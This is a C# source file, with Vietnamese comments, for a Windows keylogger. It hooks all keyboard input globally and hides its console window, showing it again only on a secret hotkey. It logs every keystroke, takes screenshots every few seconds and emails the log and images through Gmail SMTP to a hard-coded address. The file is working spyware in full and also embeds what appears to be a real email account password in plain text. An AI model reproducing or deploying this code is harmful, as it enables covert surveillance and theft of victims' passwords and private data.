using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLogger
{
    class Program
    {
        #region Bắt phím
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private static string logName = "Log_";
        private static string logExtendtion = ".txt";

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        /// <summary>
        /// Cấp quyền cho LowLevelKeyboardProc để dùng user32.dll
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

        /// <summary>
        /// Cài đặt cho việc bắt phím vào tất cả chương trình
        /// </summary>
        /// <param name="proc"></param>
        /// <returns></returns>
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
                }
            }
        }

        /// <summary>
        /// Mỗi lần nhập phím sẽ ghi lại 
        /// sau đó gọi hàm CallNextHookEx để chờ việc nhập phím tiếp theo
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                CheckHotkey(vkCode);
                WriteLog(vkCode);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        /// <summary>
        /// Ghi lại phím đã nhập vào file log.txt
        /// </summary>
        /// <param name="vkCode"></param>
        static void WriteLog(int vkCode)
        {
            Console.WriteLine((Keys)vkCode);
            string logNameToWrite = logName + DateTime.Now.ToLongDateString() + logExtendtion;
            StreamWriter sw = new StreamWriter(logNameToWrite, true);
            sw.Write((Keys)vkCode);
            sw.Close();
        }

        /// <summary>
        /// Chạy việc bắt phím đc nhập vào và ẩn keylogger
        /// Keylogger chỉ hiển thị lại nếu nhấn phải phím tắt của windows
        /// </summary>
        static void HookKeyboard()
        {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }
        #endregion

        #region Thiết lập phiết tắt
        /// <summary>
        /// Xử lí sự kiện ban đầu
        /// Cài đặt tổ hợp phím tắt
        /// </summary>
        static bool isHotkey = false;
        static bool isShowing = false;
        static Keys previousKey = Keys.Separator;

        static void CheckHotkey(int vkCode)
        {
            if (previousKey == Keys.RControlKey && (Keys)(vkCode) == Keys.K)
                isHotkey = true;

            if(isHotkey)
            {
                if(!isShowing)
                    DisplayWindow();
                else
                HideWindow();

                isShowing = !isShowing;
            }

            previousKey = (Keys)vkCode;
            isHotkey = false;
        }
        #endregion              

        #region Chụp màn hình
        static string imagePath = "Image_";
        static string imageExtendtion = ".png";

        static int imageCount = 0;
        static int captureTime = 2000;

        /// <summary>
        /// Chụp màn hình sau đó lưu vào imagePath
        /// </summary>
        static void CaptureScreen()
        {
            //Create a new bitmap.
            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                           Screen.PrimaryScreen.Bounds.Height,
                                           PixelFormat.Format32bppArgb);

            // Create a graphics object from the bitmap.
            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

            // Chụp ảnh màn hình từ góc trên bên trái xuống góc phải bên dưới
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                        Screen.PrimaryScreen.Bounds.Y,
                                        0,
                                        0,
                                        Screen.PrimaryScreen.Bounds.Size,
                                        CopyPixelOperation.SourceCopy);

            string directoryImage = imagePath + DateTime.Now.ToLongDateString();

            if (!Directory.Exists(directoryImage))
            {
                Directory.CreateDirectory(directoryImage);
            }
            // Lưu ảnh đã chụp vào đường dẫn đã chọn
            string imageName = string.Format("{0}\\{1}{2}", directoryImage, DateTime.Now.ToLongDateString() + imageCount, imageExtendtion);

            try
            {
                bmpScreenshot.Save(imageName, ImageFormat.Png);
            }
            catch
            {

            }
            imageCount++;
        }

        #endregion

        #region Timer
        /// <summary>
        /// Tạo 1 luồng song song với việc bắt phím
        /// để lặp lại việc trong 1 khoảng thời gian nhất định
        /// </summary>
        static int interval = 1;

        static void StrartTimer()
        {
            Thread thread = new Thread(() =>
            {
                while (true)
                {
                    Thread.Sleep(1);

                    if(interval % captureTime == 0)
                        CaptureScreen();

                    if (interval % MailTime == 0)
                        SendMail();

                    interval++;

                    if (interval >= 1000000)
                        interval = 0;
                }  
            });
            thread.IsBackground = true;
            thread.Start();
        }
        #endregion

        #region Cài đặt hiển thị cửa sổ
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        // Ẩn cửa sổ
        const int SW_HIDE = 0;

        // Hiện cửa sổ
        const int SW_SHOW = 5;

        static void HideWindow()
        {
            IntPtr console = GetConsoleWindow();
            ShowWindow(console, SW_HIDE);
        }

        static void DisplayWindow()
        {
            IntPtr console = GetConsoleWindow();
            ShowWindow(console, SW_SHOW);
        }
        #endregion

        #region Gửi mail
        static int MailTime = 20000;
        static void SendMail()
        {
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");

                mail.From = new MailAddress("minhthuanpttt@gmail.com");         //Mail sẽ gửi thông tin đi
                mail.To.Add("transfermirrorofneymar@gmail.com");                //Mail nhận đc thông tin
                mail.Subject = "Keylogger date: " + DateTime.Now.ToLongDateString();
                mail.Body = "Thông tin: \n";

                string logFile = logName + DateTime.Now.ToLongDateString() + logExtendtion;

                //Chỉ lấy nội dung file log.txt
                if (File.Exists(logFile))
                {
                    StreamReader sr = new StreamReader(logFile);

                    mail.Body += sr.ReadToEnd();

                    sr.Close();
                }

                //Lấy tất cả hình ảnh trong thư mục đã cài đặt
                string directoryImage = imagePath + DateTime.Now.ToLongDateString();
                DirectoryInfo image = new DirectoryInfo(directoryImage);
                
                //Đính kèm file ảnh để gửi
                foreach (FileInfo item in image.GetFiles("*.png"))
                {
                    if (File.Exists(directoryImage + "\\" + item.Name))
                        mail.Attachments.Add(new Attachment(directoryImage + "\\" + item.Name));
                }

                SmtpServer.Port = 587;
                //Điền thông tin mail sẽ gửi thông tin
                SmtpServer.Credentials = new System.Net.NetworkCredential("minhthuanpttt@gmail.com", "Yourluckysmile2004");
                SmtpServer.EnableSsl = true;

                SmtpServer.Send(mail);
                Console.WriteLine("Send mail!");

                // Dùng đường dẫn bên dưới để bật quyền cho phép truy cập ở mail gửi thông tin
                // https://www.google.com/settings/u/1/security/lesssecureapps
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }
        #endregion

        static void Main(string[] args)
        {
            HideWindow();
            StrartTimer();
            HookKeyboard();
        }
    }
}
